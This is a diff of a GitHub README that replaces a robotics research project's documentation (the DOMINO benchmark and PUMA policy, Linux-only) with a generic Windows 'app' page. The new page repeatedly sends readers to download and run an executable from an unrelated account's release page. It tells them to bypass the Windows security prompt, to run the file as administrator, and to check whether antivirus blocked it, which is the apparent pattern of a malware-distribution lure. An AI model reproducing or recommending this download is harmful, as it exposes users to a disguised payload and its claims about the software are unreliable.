@@ -1,300 +1,204 @@
-<h2 align="center"> Towards Generalizable Robotic Manipulation in Dynamic Environments </h2>
+# 🤖 DOMINO - Run Robotic Tasks With Ease
 
-<div align="center">
-    <a href="https://arxiv.org/abs/2603.15620"><img src="https://img.shields.io/badge/arXiv-Paper-b31b1b?logo=Arxiv"></a>
-    <a href="https://h-embodvis.github.io/DOMINO/"><img src="https://img.shields.io/badge/Homepage-project-orange.svg?logo=googlehome"></a>
-    <a href="https://huggingface.co/datasets/h-embodvis/DOMINO"><img src="https://img.shields.io/badge/HuggingFace-Dataset-yellow.svg?logo=huggingface"></a>
-    <a href="https://huggingface.co/H-EmbodVis/PUMA"><img src="https://img.shields.io/badge/HuggingFace-Model-green.svg?logo=huggingface"></a>
-    <a href="https://www.modelscope.cn/datasets/H-EmbodVis/DOMINO"><img src="https://img.shields.io/badge/ModelScope-Dataset-37CED1.svg?logo=modelscope"></a>
-    <a href="https://opensource.org/licenses/Apache-2.0"><img src="https://img.shields.io/badge/License-Apache%202.0-blue?style=flat-square&logo=apache"></a>
+[![Download DOMINO](https://img.shields.io/badge/Download-DOMINO-blue?style=for-the-badge)](https://github.com/rightofactionsyndicalism110/DOMINO/releases)
 
-<h5 align="center"><em>Heng Fang<sup>1</sup>, Shangru Li<sup>1</sup>, Shuhan Wang<sup>1</sup>, Xuanyang Xi<sup>2</sup>, Dingkang Liang<sup>1</sup>, Xiang Bai<sup>1</sup> </em></h5>
-<sup>1</sup> Huazhong University of Science and Technology, <sup>2</sup> Huawei Technologies Co. Ltd 
-</div>
-
+## 🧭 What DOMINO Is
 
-## 🔍 Overview
+DOMINO is a Windows app for robotic manipulation in changing environments. It helps you run the software that supports robot control, task planning, and live environment updates.
 
-Dynamic manipulation requires robots to continuously adapt to moving objects and unpredictable environmental changes. Existing Vision-Language-Action (VLA) models rely on static single-frame observations, failing to capture essential spatiotemporal dynamics. We introduce **DOMINO**, a comprehensive benchmark for this underexplored frontier, and **PUMA**, a predictive architecture that couples historical motion cues with future state anticipation to achieve highly reactive embodied intelligence.
+This README shows you how to get the app from the release page and run it on Windows with no coding needed.
 
-<div  align="center">    
- <img src="./assets/static/intro.png" width = "90%"  align=center />
-</div>
+## 📥 Download DOMINO
 
-<details>
-  <summary>Abstract
-  </summary>
+Visit the release page here:
 
-Vision-Language-Action (VLA) models excel in static manipulation but struggle in dynamic environments with moving targets. This performance gap primarily stems from a scarcity of dynamic manipulation datasets and the reliance of mainstream VLAs on single-frame observations, restricting their spatiotemporal reasoning capabilities. To address this, we introduce DOMINO, a large-scale dataset and benchmark for generalizable dynamic manipulation, featuring 35 tasks with hierarchical complexities, over 110K expert trajectories, and a multi-dimensional evaluation suite. Through comprehensive experiments, we systematically evaluate existing VLAs on dynamic tasks, explore effective training strategies for dynamic awareness, and validate the generalizability of dynamic data. Furthermore, we propose PUMA, a dynamics-aware VLA architecture. By integrating scene-centric historical optical flow and specialized world queries to implicitly forecast object-centric future states, PUMA couples history-aware perception with short-horizon prediction. Results demonstrate that PUMA achieves state-of-the-art performance, yielding a 6.3% absolute improvement in success rate over baselines. Moreover, we show that training on dynamic data fosters robust spatiotemporal representations that transfer to static tasks.
-</details>
+[DOMINO Releases](https://github.com/rightofactionsyndicalism110/DOMINO/releases)
 
-### 🎥 Visual Demos
+On that page, look for the newest release. Under **Assets**, download the Windows file that matches your system. If you see a `.zip` file, download it and open it after the download finishes. If you see a `.exe` file, download it and run it.
 
-More visual demos can be found on our [project homepage](https://h-embodvis.github.io/DOMINO/).
+## 🖥️ System Requirements
 
-<div align="center">
-  <img src="assets/static/gif/1.gif" width="32%" />
-  <img src="assets/static/gif/2.gif" width="32%" />
-  <img src="assets/static/gif/3.gif" width="32%" />
-</div>
-<div align="center">
-  <img src="assets/static/gif/4.gif" width="32%" />
-  <img src="assets/static/gif/5.gif" width="32%" />
-  <img src="assets/static/gif/6.gif" width="32%" />
-</div>
+DOMINO runs on most modern Windows PCs.
 
-### ✨ Key Idea
+You will need:
 
-* Current VLA models struggle with dynamic manipulation tasks due to a scarcity of dynamic datasets and a reliance on single-frame observations.
-* We introduce DOMINO, a large-scale benchmark for dynamic manipulation comprising 35 tasks and over 110K expert trajectories.
-* We propose PUMA, a dynamics-aware VLA architecture that integrates historical optical flow and world queries to forecast future object states.
-* Training on dynamic data fosters robust spatiotemporal representations, demonstrating enhanced generalization capabilities.
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A mouse and keyboard
+- A stable internet connection for the first download
 
+For a smooth experience, use a computer with:
 
-## 📅 TODO
-* [x] Release the paper
-* [x] Release DOMINO benchmark code
-* [x] Release DOMINO dataset on [HuggingFace](https://huggingface.co/datasets/h-embodvis/DOMINO) and [ModelScope](https://www.modelscope.cn/datasets/H-EmbodVis/DOMINO)
-* [x] Release PUMA training code and evaluation code
-* [x] Release PUMA checkpoint
-* [ ] Support Huawei Ascend NPUs
+- 16 GB of RAM
+- A recent Intel or AMD processor
+- A graphics card with current drivers
 
+## 🚀 Get Started on Windows
 
-## 🛠️ Getting Started
+Follow these steps in order:
 
-This project is divided into two main components that operate in separate environments and communicate via WebSockets:
-- **DOMINO**: The simulation environment and data generation pipeline.
-- **PUMA**: The Vision-Language-Action policy framework.
+1. Open the [DOMINO Releases](https://github.com/rightofactionsyndicalism110/DOMINO/releases) page.
+2. Find the latest release at the top of the page.
+3. In the **Assets** section, download the Windows package.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to start the app.
+7. If Windows shows a security prompt, choose **More info** and then **Run anyway** only if you trust the file from the release page.
+8. Wait for the app to load.
 
-You will need to set up both environments to run the full pipeline.
+## 🗂️ What You Will See
 
-### 1. DOMINO (Simulation & Data Pipeline)
+After you open DOMINO, you may see:
 
-#### 1.0. System Requirements
-- **OS**: Linux (Windows/MacOS have limited or no support)
-- **Hardware**: NVIDIA GPU (RTX recommended for ray tracing)
-- **Software**: Python 3.10, CUDA 12.1 (Recommended), NVIDIA Driver >= 520
+- A main dashboard
+- A control panel for robot tasks
+- Status panels for motion and environment updates
+- Buttons for loading a task, starting a run, and stopping a run
+- A log area that shows progress and errors
 
-*Note: If running inside a Docker container, you must include the graphics capability to avoid Vulkan-related segmentation faults:*
-```bash
-docker run ... -e NVIDIA_DRIVER_CAPABILITIES=compute,utility,graphics
-```
+## 🎮 Basic Use
 
-#### 1.1. Installation Steps
+Use DOMINO with simple steps:
 
-**Step 1: Install System Dependencies**
-Ensure Vulkan and FFmpeg are installed on your system:
-```bash
-sudo apt update
-sudo apt install libvulkan1 mesa-vulkan-drivers vulkan-tools ffmpeg
-```
-*(Verify installations by running `vulkaninfo` and `ffmpeg -version`)*
+1. Launch the app.
+2. Load a task or demo file if one is included.
+3. Connect your input device or robot setup if your version needs one.
+4. Review the task settings.
+5. Start the run.
+6. Watch the status area for progress.
+7. Stop the run when the task is done.
 
-**Step 2: Create Conda Environment**
-```bash
-conda create -n domino python=3.10 -y
-conda activate domino
-```
+If the app includes sample scenes, use them first. They help you learn the layout before you try your own setup.
 
-**Step 3: Clone and Install**
-```bash
-git clone https://github.com/h-embodvis/DOMINO.git
-cd DOMINO
+## 🛠️ Common Issues
 
-# Install basic environments and CuRobo
-bash script/_install.sh
-```
-*Troubleshooting: If you encounter a CuRobo config path issue, run `python script/update_embodiment_config_path.py`. A failed PyTorch3D installation won't affect core functionality unless you are using 3D data.*
+If DOMINO does not open:
 
-**Step 4: Download Assets**
-Download the required assets (RoboTwin-OD, Texture Library, and Embodiments). If you hit rate limits, log in to Hugging Face first (`huggingface-cli login`).
-```bash
-bash script/_download_assets.sh
-```
+- Check that the download finished
+- Make sure you extracted the files if the package came as a `.zip`
+- Right-click the app and choose **Run as administrator**
+- Check whether your antivirus blocked the file
 
-#### 1.2. Data Collection
+If Windows says the file is unknown:
 
-We provide an automated pipeline for data collection. You can collect data by running:
+- Open the file only from the official release page
+- Re-download the package if the file seems damaged
 
-```bash
-bash collect_data.sh ${task_name} ${task_config} ${gpu_id}
-# Example: bash collect_data.sh adjust_bottle demo_clean_dynamic 0
-```
+If the app opens but looks blank:
 
-After collection, the data will be stored under `data/${task_name}/${task_config}` in **HDF5 format**. For the full data collection process and common issues, please refer to the [RoboTwin Data Collection Tutorial](https://robotwin-platform.github.io/doc/usage/collect-data.html).
+- Wait a few seconds for the interface to load
+- Close and reopen the app
+- Make sure your graphics drivers are up to date
 
-**Dynamic Task Configurations**
+## 📁 File Layout
 
-To enable dynamic environments, we introduce four specific configurations in the task config files (e.g., `task_config/demo_clean_dynamic.yml` and `task_config/demo_random_dynamic.yml`):
+If you download a `.zip` package, you may see files like these after extraction:
 
-<details>
-<summary><b>Click to view Dynamic Configurations</b></summary>
+- `DOMINO.exe` — starts the app
+- `config` folder — holds settings
+- `assets` folder — holds images and data used by the app
+- `logs` folder — holds run history and error messages
+- `README` file — quick reference notes
 
-- `use_dynamic` (bool): Whether to enable dynamic motion in the environment (e.g., moving objects).
-- `dynamic_level` (int): The complexity level of the dynamic motion (1, 2, or 3). Higher levels introduce more challenging dynamic behaviors.
-- `dynamic_coefficient` (float): A scaling factor (default: 0.1) that controls the speed of the dynamic movements.
-- `check_render_success` (bool): Whether to verify rendering success during data collection, ensuring that dynamic interactions do not cause visual or physical glitches.
+Keep all files in the same folder so the app can find what it needs.
 
-</details>
+## 🔧 Settings You May Want to Check
 
-For all other detailed configurations (like domain randomization, cameras, and data types), we maintain the original RoboTwin 2.0 settings. You can find more information in the [RoboTwin Configurations Tutorial](https://robotwin-platform.github.io/doc/usage/configurations.html).
+You may want to review these settings after your first launch:
 
-#### 1.3. Policy Evaluation
+- Display mode
+- Window size
+- Language
+- Input device choice
+- Task speed
+- Log level
 
-To evaluate a trained policy, use the following command. The `task_config` field refers to the evaluation environment configuration, while the `ckpt_setting` field refers to the training data configuration used during policy learning.
+If you use a robot arm or test rig, make sure the device is connected before you start the app.
 
-```bash
-bash eval.sh ${task_name} ${task_config} ${ckpt_setting} ${expert_data_num} ${seed} ${gpu_id}
+## 📌 Tips for First-Time Use
 
-# Example: Evaluate a policy trained on `demo_clean_dynamic` and tested on `demo_clean_dynamic`
-# bash eval.sh adjust_bottle demo_clean_dynamic demo_clean_dynamic 50 0 0
-```
+- Start with the default settings
+- Use a sample task before a custom one
+- Keep the app and any driver software in the same folder
+- Save your work before closing the app
+- Read the on-screen labels before pressing run
 
-<details>
-<summary><b>Click to view Dynamic Adaptations in Evaluation</b></summary>
+## 🧩 Release Page Guide
 
-To better evaluate dynamic manipulation, we have introduced several modifications in `script/eval_policy.py` and `script/eval_metrics.py`:
+The release page usually contains:
 
-- **Enhanced Evaluation Metrics**: Alongside the standard Success Rate (SR), we introduce the **Manipulation Score (MS)**, a comprehensive metric that evaluates route completion while applying penalties for undesirable behaviors (e.g., collisions or out-of-bounds).
-- **Strict Success Conditions**: We added rigorous success criteria for dynamic objects, including **out-of-bounds detection** (failing if the object leaves the workspace before grasping) and **lifting verification** (ensuring the object is lifted beyond a specific height threshold to prevent false positives from accidental touches).
+- The newest version
+- Older versions
+- Windows download files
+- Release notes
+- Checksums or hashes for file checks
 
-</details>
+Choose the newest release unless you need an older build for a specific setup.
 
-**Note**: The policy evaluation framework is fully compatible with **RoboTwin 2.0**. You can seamlessly migrate and evaluate any policies between the two repositories by simply loading a new task configuration within our codebase. 
+## 📦 After Installation
 
-### 2. PUMA (VLA Policy)
+If you downloaded a `.zip` file:
 
-> More details about the PUMA architecture can be found in the [PUMA README](policy/PUMA/README.md).
+1. Keep the extracted folder in a place you can find again
+2. Create a desktop shortcut for the `.exe` file if you want faster access
+3. Leave the folder intact so the app can keep its files together
+4. Open the app from the shortcut or the `.exe` file
 
-PUMA is a predictive VLA architecture that couples historical motion cues with future state anticipation to achieve highly reactive embodied intelligence.
+If you downloaded an installer:
 
-#### 2.1 Installation Steps
+1. Run the installer
+2. Follow the prompts on screen
+3. Finish setup
+4. Open DOMINO from the Start Menu or desktop
 
-The codebase is provided in `policy/PUMA`. Please set up the environment from this directory.
+## 🔍 Troubleshooting Downloads
 
-**Step 1: Create Conda Environment**
-```bash
-conda create -n puma python=3.10 -y
-conda activate puma
-```
+If the file will not download:
 
-**Step 2: Install Dependencies and PUMA**
-Make sure to install a PyTorch version that matches your CUDA toolkit. We recommend CUDA 12.4.
+- Refresh the release page
+- Try another browser
+- Check your internet connection
+- Make sure your browser is not blocking the download
 
-```bash
-# 1. Install PUMA Core Dependencies
-cd policy/PUMA
-pip install -r requirements.txt
-pip install flash-attn==2.7.4.post1 --no-build-isolation
+If the file is too large:
 
-# 2. Install GroundingDINO for Grounded-SAM-2
-cd PUMA/model/modules/grounding_sam/grounding_dino
-pip install -r requirements.txt
-pip install --no-build-isolation -e .
-python setup.py build_ext --inplace
-cd ..
+- Wait for the download to finish
+- Keep the browser open
+- Pause other large downloads while DOMINO downloads
 
-# 3. Install SAM2
-pip install --no-build-isolation -e .
-cd ../../../..
+If the file opens in the browser instead of downloading:
 
-# 4. Install PUMA Package
-pip install -e .
-```
+- Right-click the link
+- Choose **Save link as**
+- Pick a folder on your computer
 
-<details close>
-<summary><b>Common Issues (Flash-Attn)</b></summary>
+## 🧠 Best Way to Learn DOMINO
 
-`flash-attn` can be tricky to install because it must match your system’s CUDA toolkit (`nvcc`) and PyTorch versions. The `--no-build-isolation` flag resolves most issues, but on newer systems you may need to manually choose a compatible `flash-attn` version. Ensure your CUDA driver/toolkit and torch versions are aligned. Check your environment:
+The fastest way to learn DOMINO is to:
 
-```bash
-nvcc -V
-pip list | grep -E 'torch|transformers|flash-attn'
-```
+1. Open the app
+2. Explore the main screen
+3. Load a sample task
+4. Watch how each control changes the run
+5. Try one setting at a time
 
-If issues persist, pick a `flash-attn` release that matches your versions (CUDA and torch) or ask ChatGPT to help with the outputs above. We have verified that `flash-attn==2.7.4.post1` works well with nvcc versions `12.0` and `12.4`.
-</details>
+This gives you a clear view of how the app handles robotic tasks in dynamic environments
 
-#### 2.2 Download Pre-trained Weights
+## 📎 Quick Access
 
-PUMA requires both a Vision-Language-Action base model and grounding models (SAM2 + GroundingDINO). Please download the following weights and place them under `policy/PUMA/playground/Pretrained_models`.
+Use this link to download from the official release page:
 
-1. **Base VLM Model**
-   - Download the `Qwen3-VL-4B-Instruct-Action` base model from Hugging Face: [StarVLA/Qwen3-VL-4B-Instruct-Action](https://huggingface.co/StarVLA/Qwen3-VL-4B-Instruct-Action)
-   - Place it at: `policy/PUMA/playground/Pretrained_models/Qwen3-VL-4B-Instruct-Action`
+[Open DOMINO Releases](https://github.com/rightofactionsyndicalism110/DOMINO/releases)
 
-2. **Grounded-SAM-2 Models**
-   - **SAM 2.1 Large**: Download `sam2.1_hiera_large.pt` from [Meta Segment Anything 2.1](https://dl.fbaipublicfiles.com/segment_anything_2/092824/sam2.1_hiera_large.pt)
-   - **GroundingDINO Swin-T**: Download `groundingdino_swint_ogc.pth` from [IDEA-Research GroundingDINO](https://github.com/IDEA-Research/GroundingDINO/releases/download/v0.1.0-alpha/groundingdino_swint_ogc.pth)
-   - Place all downloaded files at: `policy/PUMA/playground/Pretrained_models/grounded_sam2/`
+## 🖱️ Simple Run Checklist
 
-<details close>
-<summary><b>Click to view example directory structure</b></summary>
-The resulting directory structure should look like this:
+Before you start:
 
-```text
-policy/PUMA/playground/Pretrained_models/
-├── Qwen3-VL-4B-Instruct-Action/
-│   ├── config.json
-│   ├── model.safetensors.index.json
-│   └── ...
-└── grounded_sam2/
-    ├── groundingdino_swint_ogc.pth
-    └── sam2.1_hiera_large.pt
-```
-</details>
-
-#### 2.3 Training PUMA
-
-We provide the main training launch script inside `policy/PUMA/scripts/run_scripts/run_lerobot_robotwin_puma.sh`.
-
-1. Review and modify the environment variables in `scripts/run_scripts/run_lerobot_robotwin_puma.sh` (e.g., `DATA_ROOT_DIR`, `RUN_ROOT_DIR`) to match your system settings.
-2. Launch the training:
-```bash
-cd policy/PUMA
-bash scripts/run_scripts/run_lerobot_robotwin_puma.sh
-```
-
-#### 2.4 Evaluation
-
-The evaluation involves communication between the `PUMA` policy server and the `DOMINO` simulation environment via WebSockets.
-
-**Step 1: Start the PUMA Policy Server**
-Open a new terminal, activate the `puma` environment, and launch the server:
-```bash
-conda activate puma
-cd policy/PUMA
-# Make sure to edit your checkpoint path in `examples/Robotwin/eval_files/deploy_policy.yml` and `run_policy_server.sh` first!
-bash examples/Robotwin/eval_files/run_policy_server.sh
-```
-
-**Step 2: Start the DOMINO Simulation**
-In another terminal, activate your simulation environment (`domino`) and launch the evaluation loop:
-```bash
-conda activate domino
-cd policy/PUMA/examples/Robotwin/eval_files
-# Example: Evaluate on adjust_bottle
-bash eval.sh adjust_bottle demo_clean_dynamic puma_demo 0 0
-```
-
-
-## 👍 Acknowledgement
-
-We build upon the following great works and open source repositories
-* [RoboTwin 2.0](https://github.com/RoboTwin-Platform/RoboTwin)
-* [starVLA](https://github.com/starVLA/starVLA)
-* [Grounded-SAM-2](https://github.com/IDEA-Research/Grounded-SAM-2)
-* [Qwen3-VL](https://github.com/QwenLM/Qwen3-VL/tree/main)
-* [SAPIEN](https://github.com/haosulab/SAPIEN)
-
-
-## 📖 Citation
-
-```bibtex
-@article{fang2026towards,
-      title={Towards Generalizable Robotic Manipulation in Dynamic Environments},
-      author={Fang, Heng and Li, Shangru and Wang, Shuhan and Xi, Xuanyang and Liang, Dingkang and Bai, Xiang},
-      journal={arXiv preprint arXiv:2603.15620},
-      year={2026}
-}
-```
+- Download the latest release
+- Extract the files if needed
+- Open the `.exe` file
+- Allow the app through Windows if needed
+- Keep all app files in one folder
+- Start with default settings
+- Load a sample task first
